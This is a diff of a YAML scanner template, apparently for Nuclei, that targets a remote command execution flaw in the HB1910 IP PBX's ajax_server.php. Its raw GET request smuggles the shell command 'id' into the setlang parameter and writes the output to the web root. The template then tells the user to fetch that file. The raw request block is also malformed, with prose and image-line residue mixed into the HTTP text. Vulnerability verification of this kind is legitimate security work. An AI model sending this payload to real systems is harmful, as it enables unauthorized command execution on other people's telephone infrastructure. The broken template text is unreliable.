@@ -3,17 +3,12 @@ info:
   name: HB1910数字IP程控交换机ajax_server.php存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/oecu021p931w3337'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: oecu021p931w3337
-    fofa: body="themes/tenant/css/login.css"
 http:
 - raw:
   - 'GET /ajax_server.php?action=setE1Language&setlang=;id>/var/www/html/1q.txt HTTP/1.1
 
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1785767141824-c46fb1a2-4fdc-419a-85f9-19114870ca15.png)
 
     访问写入的地址'
   redirects: false
